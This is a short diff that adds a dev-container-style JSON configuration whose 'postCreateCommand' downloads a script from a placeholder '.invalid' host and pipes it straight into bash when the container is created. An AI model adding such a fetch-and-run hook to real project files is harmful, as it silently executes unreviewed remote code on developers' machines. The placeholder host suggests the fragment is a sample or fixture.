@@ -1,0 +1,3 @@
+{
+  "postCreateCommand": "wget -qO- https://example.invalid/setup | bash"
+}
